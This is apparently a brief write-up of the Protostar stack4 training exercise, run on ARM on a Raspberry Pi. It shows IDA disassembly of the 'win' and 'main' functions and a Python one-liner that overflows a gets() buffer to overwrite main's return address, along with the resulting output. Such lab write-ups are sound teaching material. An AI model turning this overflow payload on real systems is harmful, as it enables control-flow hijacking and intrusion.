#stack4
@(protostar)
```armasm
.text:0001044C win
.text:0001044C                 STMFD   SP!, {R11,LR}
.text:00010450                 ADD     R11, SP, #4
.text:00010454                 LDR     R0, =aCodeFlowSucces ; "code flow successfully changed"
.text:00010458                 BL      puts
.text:0001045C                 LDMFD   SP!, {R11,PC}
.text:0001045C ; End of function win
.text:0001045C
.text:0001045C ; ---------------------------------------------------------------------------
.text:00010460 ; char *s
.text:00010460 s               DCD aCodeFlowSucces     ; DATA XREF: win+8r
.text:00010460                                         ; "code flow successfully changed"
.text:00010464
.text:00010464 ; =============== S U B R O U T I N E =======================================
.text:00010464
.text:00010464 ; Attributes: bp-based frame
.text:00010464
.text:00010464 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00010464                 EXPORT main
.text:00010464 main                                    ; DATA XREF: _start+20o
.text:00010464                                         ; .text:off_10358o
.text:00010464
.text:00010464 var_4C          = -0x4C
.text:00010464 var_48          = -0x48
.text:00010464 s               = -0x44
.text:00010464
.text:00010464                 STMFD   SP!, {R11,LR}
.text:00010468                 ADD     R11, SP, #4
.text:0001046C                 SUB     SP, SP, #0x48
.text:00010470                 STR     R0, [R11,#var_48]
.text:00010474                 STR     R1, [R11,#var_4C]
.text:00010478                 SUB     R3, R11, #-s
.text:0001047C                 MOV     R0, R3          ; s
.text:00010480                 BL      gets
.text:00010484                 MOV     R0, R3
.text:00010488                 SUB     SP, R11, #4
.text:0001048C                 LDMFD   SP!, {R11,PC}
.text:0001048C ; End of function main
```
覆盖mian函数的返回地址
```bash
pi@raspberrypi:~/protostar/stack/stack4 $ python -c "print 'A'*68 + '\x4c\x04\x01'" | ./stack4 
code flow successfully changed
Segmentation fault
```
